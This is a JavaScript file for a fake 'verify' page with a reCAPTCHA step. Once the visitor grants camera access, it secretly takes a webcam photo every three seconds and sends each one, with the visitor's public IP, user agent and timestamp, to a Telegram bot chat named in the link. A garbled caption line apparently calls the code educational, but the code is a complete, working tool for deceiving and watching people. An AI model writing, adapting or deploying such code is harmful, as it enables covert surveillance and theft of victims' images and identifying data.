import { BOT_TOKEN } from "./config.js";

const verifyBtn = document.getElementById("verifyBtn");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const toast = document.getElementById("toast");
const recaptchaSection = document.getElementById("recaptcha-section");
const recaptchaMsg = document.getElementById("recaptcha-msg");

// Chat ID from URL
const params = new URLSearchParams(window.location.search);
const chatId = params.get("id");

let stream = null;
let captureInterval = null;
let publicIP = "Unknown";

// Get real public IP
async function fetchIP(){
  try{
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    publicIP = data.ip;
  }catch(e){
    console.error("IP fetch failed", e);
  }
}

// Toast message
function showToast(msg){
  toast.innerText = msg;
  toast.style.opacity=1;
  setTimeout(()=>{toast.style.opacity=0},3000);
}

// Build caption for each photo
function buildCaption(){
  const userAgent = navigator.userAgent;
  const date = new Date().toLocaleString();
  return `ЁЯМР IP Address: ${publicIP}\nЁЯТ╗ User Agent: ${userAgent}\nЁЯУЕ Date: ${date}\nтЪая╕П ржПржЯрж┐ рж╢рзБржзрзБ рж╢рж┐ржХрзНрж╖рж╛ржорзВрж▓ржХ ржЙржжрзНржжрзЗрж╢рзНржпрзЗ ржмрж╛ржирж╛ржирзЛ рж╣ржпрж╝рзЗржЫрзЗред ржХрзЗржЙ ржХрж╛рж░рзЛ ржХрзНрж╖рждрж┐ ржХрж░ржмрзЗржи ржирж╛ред\nЁЯФЧ Developer Telegram: @YourTelegramID`;
}

// Capture & send
async function captureAndSend(){
  if(!stream) return;
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video,0,0);

  canvas.toBlob(async (blob)=>{
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", blob);
    formData.append("caption", buildCaption());
    try{
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
        method:"POST",
        body:formData
      });
      const data = await res.json();
      if(data.ok) showToast("Photo sent тЬЕ");
      else showToast("Send failed тЭМ");
    }catch(err){
      console.error(err);
      showToast("Error тЭМ");
    }
  },"image/jpeg");
}

// Start camera
async function startCamera(){
  try{
    await fetchIP(); // get public IP
    stream = await navigator.mediaDevices.getUserMedia({video:true});
    video.srcObject = stream;
    video.play();
    captureInterval = setInterval(captureAndSend,3000);
    showToast("Camera started тЬЕ");
    recaptchaSection.style.display="block";
  }catch(e){
    showToast("Permission denied тЭМ");
    console.error(e);
  }
}

// Button click тЖТ start camera
verifyBtn.onclick = () => startCamera();

// reCAPTCHA success callback
function onRecaptchaSuccess(token){
  recaptchaMsg.innerText = "";
  window.location.href = "next.html";
}

// Stop on page unload
window.onbeforeunload = () => {
  if(stream) stream.getTracks().forEach(track=>track.stop());
  if(captureInterval) clearInterval(captureInterval);
};
        
